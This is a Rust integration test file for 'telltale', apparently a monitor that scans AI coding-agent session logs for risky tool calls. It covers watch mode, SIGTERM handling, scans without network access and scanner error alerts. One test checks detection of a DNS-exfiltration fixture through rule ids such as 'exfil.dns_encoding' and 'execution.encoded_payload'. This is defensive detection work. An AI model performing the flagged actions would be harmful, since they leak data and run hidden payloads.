        summaries
            .iter()
            .all(|summary| summary["event_type"] == "health")
    );
    assert!(summaries[2]["detection_count"].as_u64().unwrap_or(0) > 0);
    assert!(summaries[4]["detection_count"].as_u64().unwrap_or(0) > 0);
    assert!(summaries[5]["detection_count"].as_u64().unwrap_or(0) > 0);
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let rotated_count = rotated_paths().len();
    assert_eq!(rotated_count, 2, "rotation should retain exactly two files");
    assert!(!oldest_rotated_path.exists());

    let events = read_events();
    assert!(events.iter().any(|event| {
        event["event_type"] == "detection" && event["session_id"] == "uc001-positive"
    }));
    assert!(events.iter().any(|event| {
        event["event_type"] == "detection"
            && event["session_id"] == "uc001-positive-server-instructions"
    }));
    assert!(events.iter().any(|event| {
        event["event_type"] == "detection"
            && event["session_id"] == "uc001-positive-tool-description"
    }));

    assert!(
        fd_counts
            .iter()
            .all(|count| *count <= fd_baseline.saturating_add(2)),
        "watch fd count exceeded the justified two-descriptor delta from baseline {fd_baseline}: {fd_counts:?}"
    );
    println!(
        "watch soak measurements: cycles={} state_bytes=[{first_state_bytes},{second_state_bytes},{valid_state_bytes},{no_op_state_bytes}] fd_baseline={fd_baseline} fd_counts={fd_counts:?} rotated_files={rotated_count} scanner_errors_before_pruning={scanner_errors_before_pruning}",
        summaries.len(),
    );
}

#[cfg(unix)]
#[test]
fn watch_exits_cleanly_on_sigterm() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    copy_dir_recursive(
        Path::new("tests/fixtures/session_stores/codex"),
        &root.join("codex"),
    );
    let session = root.join("codex/sessions/2026/04/session-a.jsonl");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let mut child = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "watch",
            "--dry-run",
            "--no-local-config",
            "--install-inventory-disabled",
            "--root",
        ])
        .arg(&root)
        .arg("--log-path")
        .arg(&log_path)
        .arg("--state-path")
        .arg(&state_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn telltale watch");

    let stdout = child.stdout.take().expect("watch stdout");
    let (line_tx, line_rx) = mpsc::channel();
    thread::spawn(move || {
        for line in BufReader::new(stdout).lines() {
            if line_tx.send(line).is_err() {
                break;
            }
        }
    });
    let deadline = Instant::now() + Duration::from_secs(20);
    let mut next_trigger = Instant::now();
    let mut attempts = 0;
    let mut last_line = String::new();
    // Retries schedule work; only the completed scan summary establishes readiness.
    loop {
        if let Some(status) = child.try_wait().expect("poll watch scan readiness") {
            fail_watch(
                &mut child,
                &format!(
                    "watch exited before a completed scan: {status:?}; attempts={attempts}; last stdout line: {last_line:?}"
                ),
            );
        }
        let now = Instant::now();
        if now >= deadline {
            fail_watch(
                &mut child,
                &format!(
                    "watch did not complete a triggered scan within 20s; attempts={attempts}; last stdout line: {last_line:?}"
                ),
            );
        }
        if now >= next_trigger {
            attempts += 1;
            append_sigterm_watch_trigger(&session, attempts).unwrap_or_else(|error| {
                fail_watch(
                    &mut child,
                    &format!("append synthetic watch trigger failed: {error}"),
                )
            });
            next_trigger = Instant::now() + Duration::from_millis(250);
        }
        match line_rx.recv_timeout(
            deadline
                .saturating_duration_since(Instant::now())
                .min(Duration::from_millis(50)),
        ) {
            Ok(Ok(line)) => {
                if is_sigterm_watch_summary(&line) && Instant::now() < deadline {
                    break;
                }
                last_line = line;
            }
            Ok(Err(error)) => {
                fail_watch(&mut child, &format!("watch stdout reader failed: {error}"))
            }
            Err(mpsc::RecvTimeoutError::Disconnected) => fail_watch(
                &mut child,
                &format!(
                    "watch stdout disconnected before completed scan; attempts={attempts}; last stdout line: {last_line:?}"
                ),
            ),
            Err(mpsc::RecvTimeoutError::Timeout) => {}
        }
    }
    let kill = Command::new("kill")
        .args(["-TERM", &child.id().to_string()])
        .status()
        .unwrap_or_else(|error| fail_watch(&mut child, &format!("send SIGTERM failed: {error}")));
    if !kill.success() {
        fail_watch(&mut child, &format!("send SIGTERM failed: {kill:?}"));
    }

    let deadline = Instant::now() + Duration::from_secs(15);
    loop {
        if let Some(status) = child.try_wait().expect("poll telltale watch") {
            if !status.success() {
                fail_watch(
                    &mut child,
                    &format!("watch should exit cleanly on SIGTERM, got {status:?}"),
                );
            }
            break;
        }
        if Instant::now() > deadline {
            fail_watch(&mut child, "telltale watch did not exit after SIGTERM");
        }
        thread::sleep(Duration::from_millis(100));
    }
}

#[test]
fn scan_once_emits_native_high_risk_detection_without_network() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions/2026/04");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("uc001-positive.jsonl"),
        include_str!(
            "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
        ),
    )
    .expect("uc001 fixture");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind no-network probe");
    listener
        .set_nonblocking(true)
        .expect("nonblocking no-network probe");
    let api_base = format!("http://{}", listener.local_addr().expect("probe address"));
    let rule_path = std::env::current_dir()
        .expect("repo cwd")
        .join("config/rules/tool-call-regex.yaml");
    fs::write(
        temp.path().join(".env"),
        format!(
            "LITELLM_API_BASE={api_base}\nLITELLM_API_KEY=test-key\nMODEL=triage-model\nLLAMA_GUARD_MODEL=guard-model\n"
        ),
    )
    .expect("mock env");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--rules"])
        .arg(&rule_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_RISK_THRESHOLD_HIGH", "1")
        .current_dir(temp.path())
        .output()
        .expect("run telltale scan");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(matches!(
        listener.accept(),
        Err(error) if error.kind() == std::io::ErrorKind::WouldBlock
    ));

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let detection = events
        .iter()
        .find(|event| event["event_type"] == "detection")
        .expect("detection event");
    assert!(detection.get("triage").is_none());
    assert!(
        !detection["timeline_anchors"]
            .as_array()
            .expect("timeline anchors")
            .is_empty()
    );
    assert!(detection["response"].is_object());
}

#[test]
fn canonical_codex_dns_exfil_projects_fixed_event3_evidence() {
    const COMMAND_HASH: &str = "e359841309a2ad6b6b698dbcd7f054a2d0470841a788ffb060b1763586b3ed7f";
    const OBSERVATION_HASH: &str =
        "b167d3da5f674468318c67cff289259acc0904c3a711e655bd1509d1499803e8";
    let root = tempdir().unwrap();
    let sessions = root.path().join("codex/sessions/2026/04");
    fs::create_dir_all(&sessions).unwrap();
    fs::copy(
        Path::new(env!("CARGO_MANIFEST_DIR")).join(
            "tests/fixtures/session_stores/codex/sessions/2026/04/uc003-positive-dns-exfil.jsonl",
        ),
        sessions.join("uc003-positive-dns-exfil.jsonl"),
    )
    .unwrap();
    let scanned = telltale_core::Pipeline::builder()
        .build()
        .unwrap()
        .scan_root(root.path())
        .unwrap();
    let detections = scanned
        .iter()
        .map(|(_, event)| event)
        .filter(|event| event.event_type == "detection")
        .collect::<Vec<_>>();
    assert_eq!(detections.len(), 1);
    let event = detections[0];
    assert_eq!(event.session_id, "uc003-positive-dns-exfil");
    assert_eq!(
        event.rule_ids,
        [
            "chain.shell_encoded_payload",
            "execution.encoded_payload",
            "execution.shell",
            "exfil.dns_encoding",
        ]
    );
    assert_eq!(event.risk_score, 130);

    let mut contributions = event
        .risk_contributions
        .iter()
        .map(|item| (item.id(), item.points()))
        .collect::<Vec<_>>();
    contributions.sort_unstable();
    assert_eq!(
        contributions,
        [
            ("chain.shell_encoded_payload", 10),
            ("execution.encoded_payload", 50),
            ("execution.shell", 15),
            ("exfil.dns_encoding", 55),
        ]
    );

    let mut evidence = event
        .evidence
        .iter()
        .map(|item| {
            (
                item.field.as_str(),
                item.hash.as_deref(),
                item.rule_id.as_deref(),
            )
        })
        .collect::<Vec<_>>();
    evidence.sort_unstable();
    let mut expected_evidence = [
        "execution.shell",
        "execution.encoded_payload",
        "exfil.dns_encoding",
    ]
    .into_iter()
    .flat_map(|rule| {
        [
            ("command", Some(COMMAND_HASH), Some(rule)),
            (
                "canonical_observation_id",
                Some(OBSERVATION_HASH),
                Some(rule),
            ),
        ]
    })
    .collect::<Vec<_>>();
    expected_evidence.sort_unstable();
    assert_eq!(evidence, expected_evidence);

    assert_eq!(event.timeline_anchors.len(), 1);
    assert_eq!(event.timeline_anchors[0].entry_index, 0);
    assert_eq!(event.timeline_anchors[0].rule_ids, event.rule_ids);
    assert_eq!(event.timeline_anchors[0].evidence_fields, ["command"]);
}

#[test]
fn scan_once_uses_canonical_threshold_without_network() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions/2026/04");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("uc001-positive.jsonl"),
        include_str!(
            "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
        ),
    )
    .expect("uc001 fixture");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let rule_path = std::env::current_dir()
        .expect("repo cwd")
        .join("config/rules/tool-call-regex.yaml");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--rules"])
        .arg(&rule_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_RISK_THRESHOLD_HIGH", "1")
        .env_remove("LITELLM_API_BASE")
        .env_remove("LITELLM_API_KEY")
        .env_remove("MODEL")
        .env_remove("LLAMA_GUARD_MODEL")
        .current_dir(temp.path())
        .output()
        .expect("run telltale scan");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let lines = fs::read_to_string(log_path).expect("log file");
    let detection = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .find(|event| event["event_type"] == "detection")
        .expect("detection event");
    assert!(detection.get("triage").is_none());
    assert!(detection["response"].is_object());

    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    assert!(
        validator.is_valid(&detection),
        "native detection event failed schema validation"
    );
}

#[test]
fn operational_alert_emitted_when_scanner_errors_exceed_threshold() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    // Use a malformed source that triggers a scanner_error event.
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_OP_ALERT_MAX_SCANNER_ERRORS", "0")
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    let events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    let alert = events
        .iter()
        .find(|event| event["event_type"] == "operational_alert")
        .expect("operational_alert event should be present");
    assert_eq!(alert["severity"], "warning");
    assert_eq!(alert["client"], "scanner");
    assert_eq!(alert["session_id"], "scanner");
    assert!(
        alert["categories"]
            .as_array()
            .unwrap()
            .contains(&Value::String("operational".to_string()))
    );
    assert!(
        alert["tags"]
            .as_array()
            .unwrap()
            .contains(&Value::String("operational".to_string()))
    );
    assert!(
        alert["tags"]
            .as_array()
            .unwrap()
            .contains(&Value::String("scanner_health".to_string()))
    );
    assert_eq!(alert["risk_score"], 0);
    assert_eq!(alert["telltale_version"], env!("CARGO_PKG_VERSION"));

    // Verify the alert_type evidence field.
    let alert_type_evidence = alert["evidence"]
        .as_array()
        .unwrap()
        .iter()
        .find(|e| e["field"] == "alert_type")
        .expect("alert_type evidence");
    assert_eq!(
        alert_type_evidence["redacted_value"],
        "scanner_error_threshold_exceeded"
    );

    // Validate against the event schema.
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema json");
    let validator = validator_for(&schema).expect("schema validator");
    assert!(
        validator.is_valid(alert),
        "operational_alert event failed schema validation"
    );
}

#[test]
fn operational_alert_not_emitted_when_scanner_errors_below_threshold() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_OP_ALERT_MAX_SCANNER_ERRORS", "5")
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    let events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    assert!(
        !events
            .iter()
            .any(|event| event["event_type"] == "operational_alert"),
        "operational_alert should not be emitted when errors are below threshold"
    );
}

#[test]
fn scanner_error_events_dedup_on_subsequent_scans() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let run_scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .env("TELLTALE_OP_ALERT_MAX_SCANNER_ERRORS", "5")
            .output()
            .expect("run telltale");

        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };

    run_scan();

    let lines = fs::read_to_string(&log_path).expect("log file after first scan");
    let first_events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "scanner_error"),
        "first scan should emit a scanner_error event"
    );
    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "health"),
        "first scan should emit health for the new scanner error"
    );

    run_scan();

    let lines = fs::read_to_string(&log_path).expect("log file after second scan");
    let all_events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    let scanner_errors: Vec<_> = all_events
        .iter()
        .filter(|event| event["event_type"] == "scanner_error")
        .collect();
    assert_eq!(
        scanner_errors.len(),
        1,
        "second scan should suppress an unchanged scanner_error"
    );

    let health_events: Vec<_> = all_events
        .iter()
        .filter(|event| event["event_type"] == "health")
        .collect();
    assert_eq!(
        health_events.len(),
        1,
        "second scan should not emit health for an unchanged scanner_error"
    );
}
